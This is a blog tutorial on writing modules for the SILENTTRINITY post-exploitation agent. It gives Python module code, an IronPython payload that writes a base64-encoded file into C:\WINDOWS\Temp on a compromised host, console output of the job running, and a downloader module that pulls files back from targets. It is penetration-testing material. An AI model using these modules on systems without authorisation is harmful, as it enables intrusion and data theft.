---
layout: post
title:  "Writing a basic Module for SILENTTRINITY"
date:   2018-10-21 18:47:00 -0400
categories:
  - Code
tags:
  - Python
  - SILENTTRINITY
  - IronPython
  - Pentesting
---

***SILENTTRINITY*** is a post-exploitation agent powered by Python, IronPython and C#/.NET written by [byt3bl33d3r](https://twitter.com/byt3bl33d3r), also author of [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), the swiss army knife for pentesting networks. SILENTTRINITY was presented at DerbyCon 8.0 and everybody was really impressed (yes, I was also there). I really like C# (.NET) and Python, those are my favorites programming languages and [IronPython](https://github.com/IronLanguages/ironpython2) looks really promising. So why not contribute to this project? ![SILENTTRINITY][SILENTTRINITY-screenshot]

### How does this work?

The next image explains by itself how is the dynamic here. ![SILENTTRINITY-DIAGRAM][SILENTTRINITY-diagram]

The idea is really simple: we run our initial stager, the target ask for the payload and the encrypted communication continues back and forward waiting for a job, once a job is received the target executes the job (written in IronPython) and the output is sent to the server. I highly recommend to watch Marcello's talk to have a better idea of what we're talking about here and learn the beauty of SILENTTRINITY:

[![Track 2 05 IronPython omfg Marcello Salvati](https://img.youtube.com/vi/NaFiAx737qg/0.jpg)](https://www.youtube.com/watch?v=NaFiAx737qg)

### Let's code, baby!

This is the fun part. In order to have your Developer Environment up and running follow this Wiki: [Setting up your development environment](https://github.com/byt3bl33d3r/SILENTTRINITY/wiki/Setting-up-your-development-environment). I'm using [PyCharm Community Edition](https://www.jetbrains.com/pycharm/) and I'm running [Python 3.7.0](https://www.python.org/downloads/release/python-370/) on macOS. After creating a *virtualenv* and importing the `Server` folder into the IDE, we're ready to write some code, but first I'm sharing my PyCharm setting to show you how to properly debug Console apps:

![PyCharm Debug][SILENTTRINITY-pycharm-debug]

Cool. I'm going to use a simple module written by me called [Uploader](https://github.com/byt3bl33d3r/SILENTTRINITY/pull/12).

```python
class STModule:
    def __init__(self):
        self.name = 'uploader'
        self.description = 'Upload a file to a destination path.'
        self.author = '@davidtavarez'
        self.options = {
            'File': {
                'Description': 'The absolute path of the file.',
                'Required': True,
                'Value': None
            },
            'Destination': {
                'Description': 'The destination path of the file.',
                'Required': False,
                'Value': "C:\\\\WINDOWS\\\\Temp\\\\"
            }
        }

    def payload(self):
        if self.options['File']['Value'] is None:
            return None

        import os
        import base64

        if not os.path.exists(self.options['File']['Value']):
            from core.utils import print_bad
            print_bad("Selected file do not exists.")
            return None

        with open(self.options['File']['Value'], "rb") as file:
            encoded_string = base64.b64encode(file.read()).decode("utf-8")

        with open('modules/src/uploader.py', 'r') as module_src:
            src = module_src.read()
            src = src.replace("FILENAME", os.path.basename(self.options['File']['Value']))
            src = src.replace("DESTINATION", self.options['Destination']['Value'])
            src = src.replace("DATA", encoded_string)
            return src.encode()
```

As you can notice, the class of the module must be called `STModule` and must include a `Constructor` and a definition of the method called `payload`. Our constructor must contain at least the next properties:

* ***name***: the name of the module.
* ***description***: a short summary of what your module does.
* ***author***: your handle.
* ***options***: the options accepted in your module.

All options are displayed after we decided to use the module and run the `options` command:

```
ST (modules) ≫ use uploader  
ST (modules)(uploader) ≫ options
+-------------+----------+---------------------+-----------------------------------+
| Option Name | Required | Value               | Description                       |
+-------------+----------+---------------------+-----------------------------------+
| File        | True     | None                | The absolute path of the file.    |
+-------------+----------+---------------------+-----------------------------------+
| Destination | False    | C:\\WINDOWS\\Temp\\ | The destination path of the file. |
+-------------+----------+---------------------+-----------------------------------+
ST (modules)(uploader) ≫
```

To set a value we need to use the `set` command like this:

```
ST (modules)(uploader) ≫ set File /Users/davidtavarez/uploader.txt
ST (modules)(uploader) ≫ options
+-------------+----------+----------------------------------+-----------------------------------+
| Option Name | Required | Value                            | Description                       |
+-------------+----------+----------------------------------+-----------------------------------+
| File        | True     | /Users/davidtavarez/uploader.txt | The absolute path of the file.    |
+-------------+----------+----------------------------------+-----------------------------------+
| Destination | False    | C:\\WINDOWS\\Temp\\              | The destination path of the file. |
+-------------+----------+----------------------------------+-----------------------------------+
ST (modules)(uploader) ≫ 
```

### The payload

The payload that is written in IronPython is sent to the target using the `payload` method and the source code should be placed inside the folder named `src`.

```python
from System import Convert
from System.IO import File


def DecodeBase64File(Data, FileName, FilePath="C:\\WINDOWS\\Temp\\"):
    path = "{}{}".format(FilePath, FileName)
    File.WriteAllBytes(path,Convert.FromBase64String(Data))
    return 'File copied to: {}'.format(path)

print DecodeBase64File("DATA", "FILENAME", FilePath="DESTINATION")
```

The "tricky" part resides here: `print DecodeBase64File("DATA", "FILENAME", FilePath="DESTINATION")`. We're calling `print` to read the results of `DecodeBase64File`, so the output is sent to the server:

```
ST (modules)(uploader) ≫ run all
[+] d53c4737-c23e-4ec6-875a-c59e8ffa7056 returned job result (id: TmbazEXM)
File copied to: C:\WINDOWS\Temp\uploader.txt
```

Going back to the module code, we're replacing *DATA* with the content of the file named *FILENAME* and then, passing the *DESTINATION* folder to the payload.

![It's working!][UPLOADER-screenshot]

That's it! Summarizing, there are just two steps:

1. Create a class called: STModule with a constructor and a method named: `payload`.
2. Create your IronPython payload and pass the values taken from `options`.

### But... there's more...

I really wanted to manage the output using my module, so I placed a [Pull Request](https://github.com/byt3bl33d3r/SILENTTRINITY/pull/15) for this. This is how my base class looks now:

```python
class Module:
    def __init__(self):
        self.name = 'module'
        self.description = ''
        self.author = ''
        self.options = {}

    def process(self, result):
        print(result)
```

I did create a new module called: [Downloader](https://github.com/byt3bl33d3r/SILENTTRINITY/pull/15/commits/f1c73b3341b91fea01988f18af9b60bcde6767ab) just as PoC:


```python
...
    def process(self, result):
        b64_string = result.replace("\n", "").replace("\r", "")
        b64_string += "=" * ((4 - len(b64_string) % 4) % 4)
        b64_string = b64_string.encode()

        ba = bytes(b64_string)

        with open(self.path, "wb") as file:
            file.write(base64.decodebytes(ba))

        print_good("File was downloaded successfully: {}".format(self.path))
```

Now we can have control of the response just overwritting the method: `process`.

[SILENTTRINITY-screenshot]: https://raw.githubusercontent.com/davidtavarez/davidtavarez.github.io/master/_images/posts/SILENTTRINITY_screenshot.png
[SILENTTRINITY-diagram]: https://user-images.githubusercontent.com/5151193/46646842-cd2b0580-cb49-11e8-9218-73226e977d58.png
[SILENTTRINITY-pycharm-debug]: https://raw.githubusercontent.com/davidtavarez/davidtavarez.github.io/4aa7a53f11c9ce9ed9957e60b1abace95afe5dda/_images/posts/pycharm_debug_SILENTTRINITY.png
[UPLOADER-screenshot]: https://user-images.githubusercontent.com/337107/46912579-41e5b180-cf47-11e8-8adf-d4873ee624ac.png